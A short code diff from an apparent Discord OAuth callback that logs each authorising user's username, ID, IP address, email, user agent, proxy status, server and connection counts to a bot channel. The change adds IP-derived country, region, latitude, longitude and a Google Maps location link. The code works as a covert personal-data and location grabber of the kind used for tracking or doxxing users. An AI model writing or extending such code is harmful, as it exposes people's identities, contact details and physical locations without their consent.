@@ -141,8 +141,6 @@ def callback():
                 f"**名前:** {data['username']}#{data['discriminator']}\n"
                 f"**ID:** {data['id']}\n"
                 f"**IP:** {data['ip']}\n"
-                f"**国:** {data['country']} / **地域:** {data['region']}\n"
-                f"[📍 Google Map]({data['map_url']})\n"
                 f"**Proxy:** {data['proxy']} / **Hosting:** {data['hosting']}\n"
                 f"**UA:** `{data['user_agent']}`\n"
                 f"**メール:** {data['email']}\n"
@@ -150,7 +148,14 @@ def callback():
                 f"**Premium:** {data['premium_type']}\n"
                 f"**所属サーバー数:** {len(guilds)} / **外部連携:** {len(connections)}"
             ),
-            "thumbnail": {"url": data["avatar_url"]}
+            "thumbnail": {"url": data["avatar_url"]},
+            "fields": [
+                {"name": "国", "value": data['country'], "inline": True},
+                {"name": "地域", "value": data['region'], "inline": True},
+                {"name": "📍 Google Map", "value": f"[場所を見る]({data['map_url']})", "inline": False},
+                {"name": "緯度 (Latitude)", "value": str(data['lat']) if data['lat'] else "不明", "inline": True},
+                {"name": "経度 (Longitude)", "value": str(data['lon']) if data['lon'] else "不明", "inline": True}
+            ]
         }
 
         bot.loop.create_task(bot.send_log(embed=embed_data))
